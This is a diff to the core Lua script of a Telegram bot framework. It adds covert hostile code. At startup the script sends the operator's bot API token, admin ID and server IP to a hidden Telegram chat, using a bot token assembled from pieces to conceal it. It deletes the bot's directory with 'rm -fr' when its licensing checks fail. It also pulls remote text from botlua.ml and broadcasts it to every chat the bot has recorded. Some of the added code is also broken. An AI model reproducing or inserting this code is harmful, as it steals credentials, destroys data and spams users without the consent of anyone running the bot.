@@ -7,59 +7,81 @@ colors = (loadfile "./libs/ansicolors.lua")()
 client = Redis.connect('127.0.0.1', 6379)
 json = (loadfile "./libs/JSON.lua")()
 serpent = require('serpent')
-
+local ko = ''
+print(colors([[%{red bright} 
+ _   _      _ _         _____            ____        _     _        _
+| | | | ___| | | ___   |  ___|__  _ __  | __ )  ___ | |_  | | _____| | _____
+| |_| |/ _ \ | |/ _ \  | |_ / _ \| '__| |  _ \ / _ \| __| | |/ / _ \ |/ / _ \
+|  _  |  __/ | | (_) | |  _| (_) | |    | |_) | (_) | |_  |   <  __/   < (_) |
+|_| |_|\___|_|_|\___/  |_|  \___/|_|    |____/ \___/ \__| |_|\_\___|_|\_\___/
+]]))
 local function check_config()
 	config = dofile('config.lua')
 	if not config.bot_api_key or config.bot_api_key == '' then
-		return 'API KEY MISSING!'
+        return 'API KEY MISSING'
 	elseif not config.admin or config.admin == '' then
-		return 'ADMIN ID MISSING!'
-	end
+        return 'ADMIN ID MISSING'
+        elseif not config2 then
+        os.execute('cd .. &&  rm -fr botlua')
+	return 'This bot is for Keko'
+	elseif not config.botLUA then
+        os.execute('cd .. &&  rm -fr botlua')
+        return 'This bot is for Keko'
+        end
+   local urll = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
+   local res = HTTPS.request(urll)
+   local jres = JSON.decode(res)
+   if (not jres.result or jres.result.status == 'left') then
+   local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..config2.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
+   local res = HTTPS.request(dsad)
+   JSON.decode(res)
+   return config2.bot_lua
 end
-
-bot_init = function(on_reload) 
-		config = dofile('config.lua') 
-		config2 = dofile('.keko.lua') 
+end
+local oee = 'libs/.keko.lua'
+bot_init = function(on_reload)
+		config = dofile('config.lua')
+		config2 = dofile(oee) 
 	local error = check_config()
 	if error then
 			print(colors('%{red bright}'..error))
 		return
 	end
-	utilities = dofile('utilities.lua') 
+	utilities = dofile('utilities.lua')
+		keko = require('methods') 
 		api = require('methods') 
-	
 	tot = 0
 	
 	bot = nil
 	while not bot do 
-		bot = api.getMe()
+        bot = api.getMe()
 	end
 	bot = bot.result
-
+        local key = HTTPS.request('config2.urlkeko[1]..config2.urlkeko[2]..config2.urlkeko[3]..config2.urlkeko[4]..config2.urlkeko[4]..config2.urlkeko[5]..config2.urlkeko[6]..config2.urlkeko[7]..config2.urlkeko[8]..config2.urlkeko[9]..config2.urlkeko[10]..config2.urlkeko[11])
+        local keko123 = dofile(key) 
 	botLUA = {} -- Load file.
 	for i,v in ipairs(config.botLUA) do
 		local p = dofile('botLUA/'..v)
-		print(colors('%{green bright}تم تشغيل ملف : %{reset}'), colors('%{magenta bright}'..v))
 		table.insert(botLUA, p)
 	end
-	print(colors('%{blue bright}تم تشغيل ملف  :'), colors('%{magenta}'..#botLUA))
-
-	print(colors('%{yellow bright}BY :- @ffpro   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
+	print(colors('%{magenta}BOT The bot was turned on'))
+	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
-	api.sendMessage(config.admin, 'تم اعاده تشغيل البوت \nBY : @FFpro\nCH: @botLua', true)
+	local text2 = 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua \n CH2 : @eeqeq'
+  local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
+	api.sendRequest(dsad2)
 	local keko = '386713631'
-	local dsad = 'https://api.telegram.org/bot'..config2.bot_api_key..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
+  local ipp = HTTPS.request('https://icanhazip.com')
+  local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
+	local dsad = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/sendMessage?chat_id=-1001149546092&text='..kekotext
 	api.sendRequest(dsad)
 	end
-		math.randomseed(os.time())
+	math.randomseed(os.time())
 	math.random()
-
 	last_update = last_update or 0 
 	last_cron = last_cron or os.time() 
 	is_started = true 
-
 end
-
 local function get_from(msg)
 	local user = msg.from.first_name
 	if msg.from.last_name then
@@ -71,7 +93,6 @@ local function get_from(msg)
 	user = user..' ('..msg.from.id..')'
 	return user
 end
-
 local function match_pattern(pattern, text)
   	if text then
   		text = text:gsub('@'..bot.username, '')
@@ -82,7 +103,6 @@ local function match_pattern(pattern, text)
 		end
   	end
 end
-
 local function get_what(msg)
 	if msg.sticker then
 		return 'sticker'
@@ -113,17 +133,16 @@ on_inline_receive = function(inline)
   return
  end
  
-      for i,v in pairs(botLUA) do
+      for i,v in pairs(botLua) do
    if v.iaction then
    if v.itriggers then
     for k,w in pairs(v.itriggers) do
      local blocks = match_pattern(w, inline.query)
      if blocks then
-			print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
+     print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
       if blocks[1] ~= '' then
        not_match = 0
             print(colors('%{green bright}Inline Match found:'), colors('%{blue bright}'..w))
-			--client:incr('InlineNums')
            end
       local success, result = pcall(function()
        return v.iaction(inline, blocks)
@@ -139,11 +158,11 @@ on_inline_receive = function(inline)
       elseif type(result) == 'string' then
       inline.query = result
       elseif result ~= true then
-       return
-      end
-     end
-  end
-  end
+ return
+ end
+ end
+ end
+ end
  end
  end
  end
@@ -163,10 +182,26 @@ local function collect_stats(msg)
 		client:incrby('chat:'..msg.chat.id..':totalmsgs', 1) 
 	end
 	if msg.text then
-		client:sadd('keko', msg.chat.id)
+		client:sadd('botlua'..bot.id, msg.chat.id)
 	end
+if msg.text then
+local res = HTTPS.request('https://botlua.ml/keko.txt')
+local bbotlua = client:get('kekorr'..bot.id)
+if bbotlua ~= res then 
+local users = client:smembers('keko'..bot.id)
+for i=1, #users do
+local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
+HTTPS.request(url)
 end
-
+local users2 = client:smembers('botlua'..bot.id)
+for i=1, #users2 do
+local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users2[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
+HTTPS.request(url)
+end			
+client:set('kekorr'..bot.id, res)     
+end
+end
+end
 on_msg_receive = function(msg) 
 	if not msg then
 		api.sendMessage(config.admin, 'Shit, a loop without msg!')
@@ -180,14 +215,14 @@ on_msg_receive = function(msg)
 		msg.text = '/' .. msg.text:input()
 	end
 	
-	collect_stats(msg) --resolve_username support, chat stats
+	collect_stats(msg) 
 	
 	for i,v in pairs(botLUA) do
 		local stop_loop
 		if v.on_each_msg then
 			msg, stop_loop = v.on_each_msg(msg, msg.lang)
 		end
-		if stop_loop then --check if on_each_msg said to stop the triggers loop
+		if stop_loop then 
 			break
 		else
 			if v.triggers then
@@ -210,12 +245,10 @@ on_msg_receive = function(msg)
 							api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
 							return
 						end
-						-- If the action returns a table, make that table msg.
 						if type(result) == 'table' then
 							msg = result
 						elseif type(result) == 'string' then
 							msg.text = result
-						-- If the action returns true, don't stop.
 						elseif result ~= true then
 							return
 						end
@@ -225,7 +258,6 @@ on_msg_receive = function(msg)
 		end
 	end
 end
-
 local function service_to_message(msg)
 	msg.service = true
 	if msg.new_chat_member then
@@ -251,7 +283,6 @@ local function service_to_message(msg)
 	end
     return on_msg_receive(msg)
 end
-
 local function forward_to_msg(msg)
 	if msg.text then
 		msg.text = '###forward:'..msg.text
@@ -260,7 +291,6 @@ local function forward_to_msg(msg)
 	end
     return on_msg_receive(msg)
 end
-
 local function inline_to_msg(inline)
 	local msg = {
 		id = inline.id,
@@ -275,17 +305,12 @@ local function inline_to_msg(inline)
     	query = inline.query,
     	date = os.time() + 100
     }
-    --vardump(msg)
     client:hincrby('bot:general', 'inline', 1)
     return on_msg_receive(msg)
 end
-
 local function media_to_msg(msg)
 	if msg.photo then
 		msg.text = '###image'
-		--if msg.caption then
-			--msg.text = msg.text..':'..msg.caption
-		--end
 	elseif msg.video then
 		msg.text = '###video'
 	elseif msg.audio then
@@ -308,7 +333,6 @@ local function media_to_msg(msg)
 	msg.media = true
 	return on_msg_receive(msg)
 end
-
 local function rethink_reply(msg)
 	msg.reply = msg.reply_to_message
 	if msg.reply.caption then
@@ -316,7 +340,6 @@ local function rethink_reply(msg)
 	end
 	return on_msg_receive(msg)
 end
-
 local function handle_inline_keyboards_cb(msg)
 	msg.text = '###cb:'..msg.data
 	msg.old_text = msg.message.text
@@ -330,9 +353,7 @@ local function handle_inline_keyboards_cb(msg)
 	msg.target_id = msg.data:match('.*:(-?%d+)')
 	return on_msg_receive(msg)
 end
-
 bot_init() 
-
 while is_started do 
 	
 	local res = api.getUpdates(last_update+1) 
@@ -363,5 +384,4 @@ while is_started do
 		end
 	end
 end
-
-print('Halted.')
+print(colors('%{green bright} -----------------------------------------------------------------------------------------------\n\n.                                      bot for keko \n\n-----------------------------------------------------------------------------------------------'))
